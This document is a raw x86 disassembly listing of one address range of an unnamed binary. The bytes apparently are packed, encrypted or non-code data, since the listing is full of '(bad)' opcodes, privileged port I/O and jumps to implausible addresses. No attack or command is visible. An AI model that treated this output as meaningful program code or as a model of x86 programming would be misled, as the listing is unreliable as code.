  41e981:	mov    al,BYTE PTR [ecx]
  41e983:	dec    eax
  41e984:	jmp    0x41e993
  41e986:	xor    bh,ah
  41e988:	dec    ecx
  41e989:	ror    DWORD PTR [ebp+0x5d],0x62
  41e98d:	or     eax,0xb01e34
	...
  41e9f2:	add    BYTE PTR [eax],al
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	and    esi,DWORD PTR [ecx+0x461603eb]
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    eax,0xac000001
  41ea0d:	jns    0x41ea2c
  41ea0f:	std    
  41ea10:	mov    cl,0x6f
  41ea12:	or     edx,DWORD PTR [ebx-0x5b9029ef]
  41ea18:	aaa    
  41ea19:	push   ecx
  41ea1a:	push   cs
  41ea1b:	mov    esp,0xd3ef3df3
  41ea20:	cmc    
  41ea21:	mov    dl,0x59
  41ea23:	add    eax,0x5c844fbd
  41ea28:	and    esi,edx
  41ea2a:	into   
  41ea2b:	pop    ss
  41ea2c:	pop    eax
  41ea2d:	or     eax,0x3890763f
  41ea32:	pop    edx
  41ea33:	lods   al,BYTE PTR ds:[esi]
  41ea34:	and    BYTE PTR [edi-0x7254f675],bh
  41ea3a:	lods   eax,DWORD PTR ds:[si]
  41ea3c:	in     eax,0xa7
  41ea3e:	sbb    ax,WORD PTR [eax+0x3f6a1ad]
  41ea45:	pop    eax
  41ea46:	test   DWORD PTR [esi],ecx
  41ea48:	lahf   
  41ea49:	cmp    BYTE PTR [ebx-0x7d55dc5c],dh
  41ea4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ea51:	rcr    bh,0xca
  41ea54:	inc    ecx
  41ea55:	(bad)  
  41ea56:	push   ds
  41ea57:	adc    BYTE PTR [eax],bl
  41ea59:	outs   dx,BYTE PTR ds:[esi]
  41ea5a:	sbb    BYTE PTR [edi+0x1ba076e0],al
  41ea60:	push   ebx
  41ea61:	in     eax,0xe3
  41ea63:	pop    ss
  41ea64:	aaa    
  41ea65:	into   
  41ea66:	pop    ss
  41ea67:	sbb    al,0xe2
  41ea69:	sub    eax,ebx
  41ea6b:	inc    ebx
  41ea6c:	and    cl,bh
  41ea6e:	in     al,dx
  41ea6f:	sub    DWORD PTR [eax-0x1650f6b6],ebx
  41ea75:	in     eax,dx
  41ea76:	outs   dx,DWORD PTR ds:[esi]
  41ea77:	out    0x69,al
  41ea79:	push   ss
  41ea7a:	jne    0x41e9fc
  41ea7c:	and    eax,0x82561d6a
  41ea81:	add    eax,0xc248c8ef
  41ea86:	(bad)  
  41ea87:	out    dx,al
  41ea88:	or     al,0xaf
  41ea8a:	shl    DWORD PTR [ecx-0x39],0xb3
  41ea8e:	int3   
  41ea8f:	cwde   
  41ea90:	inc    esp
  41ea91:	sub    DWORD PTR [esi+0x7e],0xb2ccff75
  41ea98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea99:	cdq    
  41ea9a:	xchg   edi,eax
  41ea9b:	adc    eax,0x19
  41ea9e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea9f:	adc    ebx,DWORD PTR ds:0x8d88a8d3
  41eaa5:	je     0x41ea76
  41eaa7:	and    al,0xb
  41eaa9:	push   ebx
  41eaaa:	dec    edx
  41eaab:	xchg   esp,eax
  41eaac:	xor    bh,BYTE PTR [edx-0x6bd04791]
  41eab2:	inc    ebx
  41eab3:	(bad)  
  41eab4:	xchg   ebx,eax
  41eab5:	sbb    bh,BYTE PTR [ecx]
  41eab7:	fs jb  0x41ea4d
  41eaba:	jnp    0x41eb01
  41eabc:	pop    ds
  41eabd:	inc    eax
  41eabe:	ins    BYTE PTR es:[edi],dx
  41eabf:	retf   0xf999
  41eac2:	or     DWORD PTR [edi+0x59abb0f5],eax
  41eac8:	and    DWORD PTR [ebx-0x995effb],0x39
  41eacf:	daa    
  41ead0:	xor    BYTE PTR [ebp-0x6f],ah
  41ead3:	jbe    0x41ea8d
  41ead5:	push   eax
  41ead6:	out    dx,eax
  41ead7:	ins    DWORD PTR es:[edi],dx
  41ead8:	les    ebp,FWORD PTR [edx]
  41eada:	and    dl,BYTE PTR [edx+0x18e0f522]
  41eae0:	setp   BYTE PTR [edx-0x28c56a9]
  41eae7:	pop    esp
  41eae8:	xor    DWORD PTR [edi],eax
  41eaea:	mov    ecx,0xb2f298f2
  41eaef:	sbb    al,0x7
  41eaf1:	jge    0x41eb35
  41eaf3:	push   0x1488c5db
  41eaf8:	xchg   ebx,eax
  41eaf9:	es clc 
  41eafb:	pop    eax
  41eafc:	jp     0x41eaf2
  41eafe:	ror    DWORD PTR [esp+edx*4-0x3cea59],cl
  41eb05:	add    al,0x49
  41eb07:	mov    edx,0x92e20d82
  41eb0c:	inc    DWORD PTR [ebx]
  41eb0e:	inc    edx
  41eb0f:	and    eax,0xec
	...
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0xf7
  41eb81:	ret    
  41eb82:	push   esi
  41eb83:	cmp    BYTE PTR [ebx],bl
  41eb85:	inc    edi
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    eax,0x84000001
  41eb8d:	push   eax
  41eb8e:	mov    al,0x9b
  41eb90:	or     DWORD PTR [edi],esp
  41eb92:	retf   
  41eb93:	shl    ch,1
  41eb95:	inc    ebp
  41eb96:	push   cs
  41eb97:	or     ch,BYTE PTR [ecx+0x2527f196]
  41eb9d:	cwde   
  41eb9e:	cmp    eax,0x243a039b
  41eba3:	hlt    
  41eba4:	cli    
  41eba5:	dec    ebp
  41eba6:	mov    ecx,0xb4c615c8
  41ebab:	mov    ds:0x3ba85ef2,al
  41ebb0:	sbb    ecx,eax
  41ebb2:	push   esi
  41ebb3:	addr16 mov eax,ds:0x9039
  41ebb7:	pusha  
  41ebb8:	and    BYTE PTR [eax+0x436657ce],al
  41ebbe:	ret    0xd047
  41ebc1:	mov    esi,0x66d8060a
  41ebc6:	dec    ebx
  41ebc7:	add    ebp,ebp
  41ebc9:	fld    TBYTE PTR [edi+eiz*1]
  41ebcc:	mov    ds:0xccf39a1f,al
  41ebd1:	(bad)  
  41ebd2:	shl    DWORD PTR [eax+0x1e],0xe7
  41ebd6:	push   ds
  41ebd7:	mov    esi,0x7c5f1caa
  41ebdc:	or     eax,0xe3053ba4
  41ebe1:	addr16 shl al,1
  41ebe4:	dec    DWORD PTR [esi-0x24]
  41ebe7:	cmp    bh,al
  41ebe9:	lds    esi,FWORD PTR [esi]
  41ebeb:	cmp    cl,BYTE PTR ss:[edx+edx*1+0x1c44b189]
  41ebf3:	std    
  41ebf4:	adc    DWORD PTR [ebp+0x6f7d0069],eax
  41ebfa:	cmc    
  41ebfb:	dec    ebx
  41ebfc:	outs   dx,BYTE PTR ds:[esi]
  41ebfd:	mov    ch,0x8f
  41ebff:	gs push ss
  41ec01:	loop   0x41eb8b
  41ec03:	aam    0xbc
  41ec05:	jnp    0x41eba4
  41ec07:	shr    DWORD PTR [edi+eiz*4+0x6b],cl
  41ec0b:	mov    eax,ds:0x9b26de1f
  41ec10:	mov    WORD PTR [ebx],fs
  41ec12:	pop    edi
  41ec13:	fidivr DWORD PTR [edi+0x608b1e7b]
  41ec19:	jle    0x41ec99
  41ec1b:	mov    bh,0x54
  41ec1d:	mov    bh,0x46
  41ec1f:	loopne 0x41ec9f
  41ec21:	sahf   
  41ec22:	(bad)  
  41ec23:	pop    edi
  41ec24:	popa   
  41ec25:	ret    0xa0f8
  41ec28:	or     bh,BYTE PTR [edi-0x35]
  41ec2b:	jmp    0x10c68153
  41ec30:	out    0xbc,al
  41ec32:	mov    eax,0xf6106d2d
  41ec37:	xchg   ebx,eax
  41ec38:	add    dl,BYTE PTR ds:[ebp+0x1b]
  41ec3c:	lods   eax,DWORD PTR ds:[esi]
  41ec3d:	pop    ebx
  41ec3e:	clc    
  41ec3f:	shrd   DWORD PTR [esi+edx*2+0x6d],eax,0xf0
  41ec45:	mov    eax,ds:0x50505efa
  41ec4a:	sub    BYTE PTR [edi-0x41],0x30
  41ec4e:	es gs or al,0xa7
  41ec52:	mov    bl,0xe4
  41ec54:	push   ebp
  41ec55:	and    dl,dl
  41ec57:	pop    es
  41ec58:	mov    esp,0x6969a96d
  41ec5d:	adc    DWORD PTR [ebx+0x6],edx
  41ec60:	in     eax,dx
  41ec61:	loop   0x41ec72
  41ec63:	in     al,0xef
  41ec65:	rcl    DWORD PTR [ebx+0x28],1
  41ec68:	jno    0x41ec76
  41ec6a:	mov    esp,edx
  41ec6c:	push   esi
  41ec6d:	cmp    eax,0x21080ae5
  41ec72:	lock xor eax,0xb014a36c
  41ec78:	or     DWORD PTR [edx-0x28],eax
  41ec7b:	jge    0x41ec59
  41ec7d:	mov    eax,ds:0xf2b000d0
  41ec82:	mov    gs,WORD PTR [edi]
  41ec84:	ins    BYTE PTR es:[edi],dx
  41ec85:	dec    edx
  41ec86:	mov    edi,0xd2e622da
  41ec8b:	jp     0x41ed07
  41ec8d:	xchg   ecx,eax
  41ec8e:	adc    ecx,DWORD PTR [ebp-0x29]
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x44d55fd0
  41ed02:	xchg   edi,eax
  41ed03:	mov    ah,0x20
  41ed05:	dec    eax
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    eax,0x8f000001
  41ed0d:	cmp    al,0x57
  41ed0f:	jmp    0x9cdb574
  41ed14:	mov    ch,BYTE PTR [esi+0x3c8a4866]
  41ed1a:	xchg   DWORD PTR [esi+ebp*2+0x19a1caf9],edx
  41ed21:	loopne 0x41ecbc
  41ed23:	and    al,0x56
  41ed25:	mov    ecx,0x875d69f4
  41ed2a:	mov    ds:0x957afbac,al
  41ed2f:	fs pop eax
  41ed31:	push   es
  41ed32:	lods   eax,DWORD PTR ds:[esi]
  41ed33:	bound  esp,QWORD PTR [ebp+ebx*8-0x7e]
  41ed37:	daa    
  41ed38:	jb     0x41ed33
  41ed3a:	(bad)  
  41ed3c:	xor    al,0x4c
  41ed3e:	jle    0x41ecfd
  41ed40:	push   edx
  41ed41:	add    ecx,DWORD PTR [edi-0x4e]
  41ed44:	cmp    DWORD PTR [eax-0x53],edi
  41ed47:	mov    gs:0x4ffc0b4a,eax
  41ed4d:	(bad)  
  41ed4e:	add    DWORD PTR [edx-0x66955928],edi
  41ed54:	mov    esi,0x1f4bb139
  41ed59:	ror    DWORD PTR [edi-0x6a46eec6],cl
  41ed5f:	sub    BYTE PTR [esi+edx*1+0x24d483c4],0x8c
  41ed67:	arpl   bp,bx
  41ed69:	fldenv [esi-0x41f0d1a7]
  41ed6f:	push   esp
  41ed70:	pop    es
  41ed71:	adc    DWORD PTR [esi+0x70],0x7956be0d
  41ed78:	dec    esi
  41ed79:	out    dx,eax
  41ed7a:	push   ebp
  41ed7b:	hlt    
  41ed7c:	jle    0x41ed98
  41ed7e:	jns    0x41ed0c
  41ed80:	sbb    al,0x53
  41ed82:	push   0xff4581b8
  41ed87:	sbb    ch,bl
  41ed89:	mov    al,ds:0x950c254b
  41ed8e:	dec    esi
  41ed8f:	jmp    0xf7d41fda
  41ed94:	gs jbe 0x41ed63
  41ed97:	lods   al,BYTE PTR ds:[esi]
  41ed98:	retf   
  41ed99:	sub    cl,BYTE PTR [ebp+0x755390f8]
  41ed9f:	(bad)  
  41eda0:	xchg   edx,eax
  41eda1:	ins    BYTE PTR es:[edi],dx
  41eda2:	pop    eax
  41eda3:	retf   
  41eda4:	adc    bl,BYTE PTR [edx]
  41eda6:	ror    DWORD PTR [esi-0x14],cl
  41eda9:	(bad)  
  41edaa:	aaa    
  41edab:	mov    bh,0xc5
  41edad:	xchg   edx,eax
  41edae:	addr16 pop ebp
  41edb0:	test   DWORD PTR [esi-0x5a84660a],ebp
  41edb6:	fucomp st(5)
  41edb8:	es add al,0x45
  41edbb:	jns    0x41ed82
  41edbd:	imul   esp,ecx,0x27
  41edc0:	dec    ebp
  41edc1:	mov    ah,0x14
  41edc3:	mov    ss:0x9defe66b,eax
  41edc9:	push   esi
  41edca:	mov    BYTE PTR [eax+0x50],dh
  41edcd:	stos   DWORD PTR es:[edi],eax
  41edce:	sar    DWORD PTR [edi+0x69f5833a],1
  41edd4:	mov    DWORD PTR [ebx+0x3a293eda],eax
  41edda:	xor    BYTE PTR [ebx-0x64a5d93e],bh
  41ede0:	ficom  DWORD PTR [ecx-0x75]
  41ede3:	test   eax,0xdacc1098
  41ede8:	mov    ah,0xb8
  41edea:	mov    ah,0xe1
  41edec:	and    BYTE PTR [edi],0xfd
  41edef:	in     al,0x5d
  41edf1:	mov    edx,DWORD PTR [edi-0xb]
  41edf4:	xchg   ebp,eax
  41edf5:	adc    DWORD PTR ds:0x18782c50,ebp
  41edfb:	pushf  
  41edfc:	lea    eax,[edi-0x34]
  41edff:	out    dx,eax
  41ee00:	loopne 0x41ed9b
  41ee02:	xchg   esi,eax
  41ee03:	mov    DWORD PTR [eax-0x5d],0x6eed3beb
  41ee0a:	xor    BYTE PTR [edi+edx*1-0x4f],bl
  41ee0e:	mov    edi,0xcd66
	...
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0x253e:0xd5f6be7
  41ee85:	dec    ecx
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    eax,0x5e000001
  41ee8d:	(bad)
  41ee91:	xchg   edx,eax
  41ee92:	adc    al,0xaa
  41ee94:	aaa    
  41ee95:	js     0x41ee28
  41ee97:	test   eax,0xf077219b
  41ee9c:	ss mov ah,0x30
  41ee9f:	inc    eax
  41eea0:	es sub al,0xa9
  41eea3:	push   ebp
  41eea4:	rcr    ecx,0xd3
  41eea7:	pop    ecx
  41eea8:	mov    ebx,0x4d642129
  41eead:	call   0xc430:0x672b3229
  41eeb4:	add    BYTE PTR [edx],0x45
  41eeb7:	push   cs
  41eeb8:	dec    edi
  41eeb9:	out    dx,al
  41eeba:	inc    esp
  41eebb:	pop    edi
  41eebc:	data16 jle 0x41eefc
  41eebf:	adc    eax,0xcd964060
  41eec4:	jmp    0x78cb841f
  41eec9:	and    ebx,DWORD PTR [ebx-0x6c]
  41eecc:	and    esp,DWORD PTR [edx]
  41eece:	xor    al,0xc4
  41eed0:	jb     0x41eeae
  41eed2:	pop    ecx
  41eed3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eed4:	jne    0x41eed1
  41eed6:	(bad)  [edi+eiz*8]
  41eed9:	outs   dx,BYTE PTR ds:[esi]
  41eeda:	xchg   edi,eax
  41eedb:	jle    0x41ef5b
  41eedd:	aam    0x6a
  41eedf:	jge    0x41eef3
  41eee1:	or     BYTE PTR [esi],cl
  41eee3:	clc    
  41eee4:	mov    ah,0x83
  41eee6:	jle    0x41ef4a
  41eee8:	retf   0x62bd
  41eeeb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eeec:	sub    DWORD PTR es:[eax+0x67],edi
  41eef0:	out    0xe2,al
  41eef2:	loop   0x41ee93
  41eef4:	in     eax,0x1a
  41eef6:	xchg   esi,eax
  41eef7:	xchg   cx,ax
  41eef9:	add    ah,BYTE PTR [ecx-0x2e]
  41eefc:	or     eax,0x76de9f2c
  41ef01:	cld    
  41ef02:	xor    DWORD PTR [ebx+0x27],esi
  41ef05:	jle    0x41eeee
  41ef07:	mov    ah,0xd5
  41ef09:	inc    ebp
  41ef0a:	loope  0x41eebc
  41ef0c:	imul   ecx,DWORD PTR [ebx+0x32],0x63
  41ef10:	cwde   
  41ef11:	sti    
  41ef12:	scas   al,BYTE PTR es:[edi]
  41ef13:	and    esi,DWORD PTR [ecx+0x6aff1e1c]
  41ef19:	pop    ebx
  41ef1a:	pop    ds
  41ef1b:	retf   
  41ef1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef1d:	mov    cs,WORD PTR [ecx*4-0x2e744979]
  41ef24:	cmp    al,0x92
  41ef26:	shl    BYTE PTR [edi-0x5f8a2084],0x8b
  41ef2d:	ror    DWORD PTR [ebx-0x3c263615],cl
  41ef33:	sbb    cl,BYTE PTR [ebp+0x62664362]
  41ef39:	(bad)
  41ef3c:	sub    edx,DWORD PTR [eax-0x55]
  41ef3f:	inc    ebx
  41ef40:	mov    ds:0x727c7029,eax
  41ef45:	nop
  41ef46:	jge    0xf864a5a6
  41ef4c:	ds mov esp,0x4aa65700
  41ef52:	test   eax,0x64d989da
  41ef57:	pop    ebp
  41ef58:	dec    esp
  41ef59:	cli    
  41ef5a:	pop    ds
  41ef5b:	imul   edi,DWORD PTR [edx-0x319ddaa],0x5e
  41ef62:	push   edx
  41ef63:	jge    0x41efca
  41ef65:	add    BYTE PTR [esi+0x56],ah
  41ef68:	jns    0x41ef39
  41ef6a:	int3   
  41ef6b:	ret    
  41ef6c:	enter  0xfece,0xaf
  41ef70:	in     al,0xda
  41ef72:	addr16 push ss
  41ef74:	ss pop ebx
  41ef76:	xor    DWORD PTR [ebp+0x63fde1cc],edi
  41ef7c:	cmp    al,0xd7
  41ef7e:	cmp    eax,0xa83e845f
  41ef83:	jl     0x41ef9c
  41ef85:	mov    al,0x9b
  41ef87:	jns    0x41ef29
  41ef89:	push   edx
  41ef8a:	icebp  
  41ef8b:	aam    0xfb
  41ef8d:	lods   eax,DWORD PTR ds:[esi]
  41ef8e:	shr    BYTE PTR [esi+ecx*8+0x0],1
	...
  41eff1:	add    BYTE PTR [eax],al
  41eff3:	add    BYTE PTR [ecx-0xda40a3],bh
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul edx,DWORD PTR [edi+0x2af31474],0x4a
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    eax,0x3b000001
  41f00d:	mov    edi,0x40057f8b
  41f012:	adc    eax,eax
  41f014:	pop    ds
  41f015:	out    0xcf,al
  41f017:	(bad)  
  41f018:	in     eax,0x92
  41f01a:	les    edi,FWORD PTR [edi]
  41f01c:	xchg   edi,eax
  41f01d:	ret    0x2d9c
  41f020:	mov    ah,0xbf
  41f022:	fldenv ds:0xd1e3f129
  41f028:	cs jo  0x41efce
  41f02b:	jge    0x41f070
  41f02d:	lds    esi,FWORD PTR [esi+0x5e038e2d]
  41f033:	rcr    DWORD PTR [ecx-0x4b],0x28
  41f037:	mov    al,0x11
  41f039:	call   0x42b7e213
  41f03e:	pop    eax
  41f03f:	mov    ebp,0xd4d2baf1
  41f044:	les    ebx,FWORD PTR ds:0xd128370a
  41f04a:	mov    dh,0x74
  41f04c:	in     al,0xd3
  41f04e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f04f:	fidiv  DWORD PTR [ebx+0x11]
  41f052:	test   al,0x52
  41f054:	mov    edx,0xa5f0306e
  41f059:	sub    ah,bl
  41f05b:	test   al,0xa8
  41f05d:	add    eax,0x6309a319
  41f062:	adc    al,0xa7
  41f064:	adc    al,0x6b
  41f066:	mov    esp,0x31ab56ec
  41f06b:	ja     0x41f034
  41f06d:	into   
  41f06e:	push   edx
  41f06f:	dec    esp
  41f070:	mov    ds,WORD PTR [ebx]
  41f072:	test   DWORD PTR [ebx],ebx
  41f074:	leave  
  41f075:	sbb    BYTE PTR [ebx+0x5a],0xb9
  41f079:	hlt    
  41f07a:	and    DWORD PTR [ecx],esp
  41f07c:	jp     0x41f02c
  41f07e:	les    esi,FWORD PTR [edi-0x10cd77e7]
  41f084:	out    dx,eax
  41f085:	sti    
  41f086:	fisub  WORD PTR [edi+ebx*4]
  41f089:	je     0x41f0b7
  41f08b:	ds aam 0xf2
  41f08e:	adc    DWORD PTR [ecx-0x6c],0xffffff91
  41f092:	add    eax,0xcea3834d
  41f097:	xchg   ecx,eax
  41f098:	out    dx,al
  41f099:	loopne 0x41f021
  41f09b:	inc    ebp
  41f09c:	mov    eax,ds:0x33780450
  41f0a1:	push   ebx
  41f0a2:	dec    ebp
  41f0a3:	sbb    esp,edi
  41f0a5:	push   esp
  41f0a6:	call   DWORD PTR [esi]
  41f0a8:	and    ebp,eax
  41f0aa:	and    ah,0xfd
  41f0ad:	or     cl,dl
  41f0af:	cs pop esp
  41f0b1:	pusha  
  41f0b2:	pop    esi
  41f0b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f0b4:	test   al,0x62
  41f0b6:	ins    BYTE PTR es:[edi],dx
  41f0b7:	int    0xb
  41f0b9:	pusha  
  41f0ba:	or     al,0x38
  41f0bc:	sbb    eax,0x177278a2
  41f0c1:	xchg   edx,eax
  41f0c2:	repnz add DWORD PTR [ebx+edi*4+0x4280aea9],0x40a3be4c
  41f0ce:	popf   
  41f0cf:	iret   
  41f0d0:	add    cl,cl
  41f0d2:	xchg   ecx,eax
  41f0d3:	dec    ecx
  41f0d4:	fs (bad) 
  41f0d7:	(bad)  
  41f0d8:	call   0xa0da64c0
  41f0dd:	aad    0x60
  41f0df:	les    esi,FWORD PTR [edx+0x7b]
  41f0e2:	xchg   DWORD PTR [ecx+0x58388641],esi
  41f0e8:	mov    ch,0x80
  41f0ea:	sbb    BYTE PTR cs:[edi+edi*1+0x382fe040],dl
  41f0f2:	adc    eax,0x9e7ebb4c
  41f0f7:	out    dx,al
  41f0f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f0f9:	nop
  41f0fa:	mov    DWORD PTR [eax],edx
  41f0fc:	mov    edx,0xbb5292f
  41f101:	sub    dl,ch
  41f103:	lods   al,BYTE PTR ds:[esi]
  41f104:	cwde   
  41f105:	(bad)  
  41f106:	or     DWORD PTR [edi+0x3f3d9ebf],eax
  41f10c:	dec    edi
  41f10d:	add    DWORD PTR [esi],edi
  41f10f:	popf   
  41f110:	and    eax,0x0
	...
  41f171:	add    BYTE PTR [eax],al
  41f173:	add    BYTE PTR [ebx+0x6c2a6cdf],bl
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4b2f:0x254b5bcc
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    eax,0x3c000001
  41f18d:	shr    DWORD PTR [esi-0x2117ff6c],cl
  41f193:	or     esp,DWORD PTR [edx]
  41f195:	jecxz  0x41f1a8
  41f197:	lods   eax,DWORD PTR ds:[esi]
  41f198:	mov    edi,DWORD PTR [eax+edi*4+0x5d6bdb4b]
  41f19f:	int    0x7a
  41f1a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1a2:	push   edx
  41f1a3:	jp     0x41f18b
  41f1a5:	push   esp
  41f1a6:	push   esp
  41f1a7:	add    edi,DWORD PTR ds:0x53adff59
  41f1ad:	mov    al,cl
  41f1af:	repz sub cl,BYTE PTR [esi+0x1824ca73]
  41f1b6:	add    ah,al
  41f1b8:	mov    al,0x16
  41f1ba:	jno    0x41f1b7
  41f1bc:	jno    0x41f1b5
  41f1be:	ins    DWORD PTR es:[edi],dx
  41f1bf:	pop    esi
  41f1c0:	push   ebp
  41f1c1:	fiadd  DWORD PTR [edx-0x74]
  41f1c4:	(bad)
  41f1c7:	aas    
  41f1c8:	leave  
  41f1c9:	imul   ecx,DWORD PTR [ebp-0x473a3e7],0x2b66023
  41f1d3:	mov    cl,BYTE PTR cs:[bx+si-0x40b5]
  41f1d9:	ins    BYTE PTR es:[edi],dx
  41f1da:	outs   dx,DWORD PTR ds:[esi]
  41f1db:	sub    ch,0xb7
  41f1de:	or     eax,0x4f3b0075
  41f1e3:	sbb    BYTE PTR [eax],ah
  41f1e5:	cmp    ch,ch
  41f1e7:	push   ss
  41f1e8:	mov    cl,0x7e
  41f1ea:	outs   dx,DWORD PTR ds:[esi]
  41f1eb:	inc    edi
  41f1ec:	fbstp  TBYTE PTR [eax+eax*8]
  41f1ef:	aad    0xb4
  41f1f1:	add    al,0x1b
  41f1f3:	add    ebx,DWORD PTR [eax+0x23f64806]
  41f1f9:	call   0x61894052
  41f1fe:	push   esi
  41f1ff:	rcl    DWORD PTR [ecx+edi*4+0x3c],0xe6
  41f204:	push   cs
  41f205:	outs   dx,BYTE PTR ds:[esi]
  41f206:	outs   dx,BYTE PTR ds:[esi]
  41f207:	mov    DWORD PTR [ebx],ecx
  41f209:	(bad)  
  41f20a:	fnstenv [eax]
  41f20c:	mov    DWORD PTR [esi],ecx
  41f20e:	test   eax,0x7559ca1a
  41f213:	sub    al,0x44
  41f215:	fdivr  st,st(0)
  41f217:	mov    ecx,edx
  41f219:	hlt    
  41f21a:	out    dx,al
  41f21b:	inc    eax
  41f21c:	fild   QWORD PTR [edi-0x35481f39]
  41f222:	dec    edx
  41f223:	pop    eax
  41f224:	adc    BYTE PTR [edx+0x71],0xc1
  41f228:	xchg   DWORD PTR [eax+ebp*1],esi
  41f22b:	popf   
  41f22c:	sbb    BYTE PTR [esi+0x1],ch
  41f22f:	and    ebx,edi
  41f231:	adc    DWORD PTR [edx+0x59],ebx
  41f234:	xchg   edi,eax
  41f235:	cmp    DWORD PTR [eax],eax
  41f237:	sbb    DWORD PTR [edi+0x6784f9aa],ebp
  41f23d:	mov    al,0xea
  41f23f:	push   ss
  41f240:	mov    ch,0xd5
  41f242:	inc    ebp
  41f243:	and    al,0x12
  41f245:	jns    0x41f274
  41f247:	and    ah,dl
  41f249:	adc    ecx,0xd2980c
  41f24f:	jmp    0xa0dda68b
  41f254:	rcr    DWORD PTR [eax-0x79],1
  41f257:	add    eax,0xf38746d9
  41f25c:	ss dec edx
  41f25e:	mov    al,ds:0xa23ceceb
  41f263:	(bad)  [ecx+ebp*2]
  41f266:	sbb    al,0x3
  41f268:	cmp    ch,dl
  41f26a:	jle    0x41f2c1
  41f26c:	cmp    bl,BYTE PTR [edx+0x7]
  41f26f:	cmp    edx,DWORD PTR [esi+esi*1]
  41f272:	inc    esp
  41f273:	lds    ecx,FWORD PTR [ebp-0x68]
  41f276:	mov    esi,0x20da4d15
  41f27b:	loopne 0x41f234
  41f27d:	ins    DWORD PTR es:[edi],dx
  41f27e:	fisttp DWORD PTR [eax+0x3c]
  41f281:	jp     0x41f22f
  41f283:	inc    ebx
  41f284:	(bad)  
  41f285:	lds    edx,FWORD PTR [ebx+0x15cda66a]
  41f28b:	jmp    0xb8e4093e
  41f290:	jne    0x41f292
	...
  41f2f2:	add    BYTE PTR [eax],al
  41f2f4:	push   ecx
  41f2f5:	sbb    edi,edi
  41f2f7:	jmp    si
  41f2fa:	fnstcw WORD PTR [edi]
  41f2fc:	jo     0x41f2eb
  41f2fe:	sahf   
  41f2ff:	jb     0x41f28a
  41f301:	or     al,ch
  41f303:	mov    ds:0x14c34,eax
  41f308:	add    eax,0xea000001
  41f30d:	loope  0x41f29c
  41f30f:	repz and DWORD PTR [edi-0x67],0x70cf4b5e
  41f317:	push   0x744cfbc0
  41f31c:	ins    BYTE PTR es:[edi],dx
  41f31d:	adc    BYTE PTR [ebp+eax*8+0x3257cafa],bl
  41f324:	not    DWORD PTR [ebx+0x24c290f2]
  41f32a:	hlt    
  41f32b:	or     BYTE PTR [esi+0x2c],cl
  41f32e:	mov    DWORD PTR [edi+0x104756b2],ecx
  41f334:	mov    eax,0x5304fa52
  41f339:	(bad)  
  41f33b:	retf   0xead4
  41f33e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f33f:	push   0x78
  41f341:	sub    DWORD PTR [edx],eax
  41f343:	adc    ecx,DWORD PTR [edi+0xe244068]
  41f349:	call   0xc829:0x88f3ad48
  41f350:	sbb    BYTE PTR [ebp-0x29],al
  41f353:	fild   DWORD PTR [eax+ecx*8+0x20]
  41f357:	xor    dl,dl
  41f359:	mov    DWORD PTR [ecx-0x3c],esi
  41f35c:	jl     0x41f3ad
  41f35e:	es jne 0x41f3c6
  41f361:	pmulhuw mm2,mm6
  41f364:	mov    al,ds:0x48583dc3
  41f369:	xor    BYTE PTR [eax],bl
  41f36b:	outs   dx,BYTE PTR ds:[esi]
  41f36c:	ret    0x6e5d
  41f36f:	outs   dx,BYTE PTR ds:[esi]
  41f370:	iret   
  41f371:	push   cs
  41f372:	xor    eax,0x21bbf717
  41f377:	dec    ebp
  41f378:	mov    al,BYTE PTR [esi-0x6a]
  41f37b:	add    ebp,DWORD PTR [ebx-0x4354f801]
  41f381:	imul   edx,DWORD PTR [edx+ebx*2+0x3cae2026],0x5d7e0c96
  41f38c:	(bad)  
  41f38e:	clc    
  41f38f:	or     edx,DWORD PTR [ebx-0x22b47b7b]
  41f395:	lds    esp,FWORD PTR [ebx]
  41f397:	out    0x35,al
  41f399:	lods   al,BYTE PTR es:[esi]
  41f39b:	in     eax,dx
  41f39c:	xchg   esp,eax
  41f39d:	out    dx,al
  41f39e:	mov    ah,0x76
  41f3a0:	fstp   TBYTE PTR [edi+0x7776bd79]
  41f3a6:	imul   esi,ecx,0xc38ef99b
  41f3ac:	xchg   ecx,eax
  41f3ad:	mov    eax,0x4c52a503
  41f3b2:	push   cs
  41f3b3:	arpl   WORD PTR [esi+ebp*2],bp
  41f3b6:	dec    esi
  41f3b7:	mov    edi,0x405f852c
  41f3bc:	and    BYTE PTR [ebx],ah
  41f3be:	inc    esp
  41f3bf:	popa   
  41f3c0:	ja     0x41f39c
  41f3c2:	mov    eax,ds:0xa5e6c81e
  41f3c7:	jnp    0x41f3f2
